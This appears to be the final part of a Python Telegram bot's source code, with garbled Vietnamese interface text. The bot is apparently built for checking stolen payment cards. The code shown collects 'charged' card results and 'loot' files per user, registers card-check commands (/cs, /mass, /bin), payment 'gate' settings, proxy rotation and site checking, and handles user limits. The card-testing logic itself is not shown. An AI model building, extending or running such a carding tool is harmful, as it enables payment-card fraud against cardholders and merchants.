            all_charged_content = []
            if os.path.exists(user_log_dir):
                sessions = sorted(os.listdir(user_log_dir))
                for session_ts in sessions:
                    file_path = os.path.join(user_log_dir, session_ts, "charged.txt")
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f: all_charged_content.append(f.read())
            
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                with io.BytesIO(combined_content.encode('utf-8')) as file_to_send:
                    filename = f"all_charged_{target_user_id}.txt"
                    await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=filename)
                await query.edit_message_text(f"‚úÖ ƒê√£ g·ª≠i file t·ªïng h·ª£p t·∫•t c·∫£ th·∫ª charge c·ªßa user `{target_user_id}`.")
            else:
                await query.edit_message_text(f"‚ÑπÔ∏è User `{target_user_id}` kh√¥ng c√≥ th·∫ª charge n√†o trong l·ªãch s·ª≠.")

        elif action == "history":
            user_log_dir = os.path.join(LOG_DIR, target_user_id)
            sessions = sorted(os.listdir(user_log_dir), reverse=True)[:25]
            keyboard = []
            for session_ts in sessions:
                summary_path = os.path.join(user_log_dir, session_ts, "summary.json")
                if os.path.exists(summary_path):
                    summary = load_json_file(summary_path)
                    counts = summary.get('counts', {})
                    try: dt_obj = datetime.strptime(session_ts, "%Y%m%d-%H%M%S"); readable_ts = dt_obj.strftime("%d/%m/%Y %H:%M")
                    except ValueError: readable_ts = session_ts
                    button_text = f"üïí {readable_ts} - ‚úÖ{counts.get('success',0)} ‚ùå{counts.get('decline',0)}"
                    keyboard.append([InlineKeyboardButton(button_text, callback_data=f"loot_session_{target_user_id}_{session_ts}")])
            
            keyboard.append([InlineKeyboardButton("¬´ Quay l·∫°i Menu Ch√≠nh", callback_data=f"loot_mainmenu_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"üìú **L·ªãch s·ª≠ check c·ªßa user `{target_user_id}`:**", reply_markup=reply_markup)

        elif action == "session":
            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("Session n√†y kh√¥ng c√≥ file k·∫øt qu·∫£ n√†o."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"T·∫£i {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("¬´ Quay l·∫°i L·ªãch S·ª≠", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Ch·ªçn file ƒë·ªÉ t·∫£i t·ª´ session `{session_ts}`:", reply_markup=reply_markup)

        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"ƒê√£ g·ª≠i file {filename}")
            else:
                await query.answer("‚ùå L·ªói: Kh√¥ng t√¨m th·∫•y file.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    # L·ªánh chung
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # L·ªánh Admin
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("gate", gate_command))
    application.add_handler(CommandHandler("setgate", set_gate_range_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    application.add_handler(CommandHandler("active", active_checks_command)) 

    # L·ªÜNH PROXY
    application.add_handler(CommandHandler("onprx", on_proxy_command))
    application.add_handler(CommandHandler("offprx", off_proxy_command))
    application.add_handler(CommandHandler("addprx", add_proxy_command))
    application.add_handler(CommandHandler("deleteprx", delete_proxy_command))
    application.add_handler(CommandHandler("testprx", test_proxy_command))
    
    # L·ªánh Check
    # ∆Øu ti√™n handler cho /cs<amount> c·ªßa admin
    application.add_handler(MessageHandler(filters.Regex(r'^/cs(\d+)'), cs_custom_amount_command))
    # Handler cho /cs th√¥ng th∆∞·ªùng
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    # L·ªánh Site Checker
    application.add_handler(CommandHandler("site", site_command))
    application.add_handler(CommandHandler("sitem", sitem_command))

    # X·ª≠ l√Ω n√∫t b·∫•m
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot ƒëang ch·∫°y v·ªõi Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
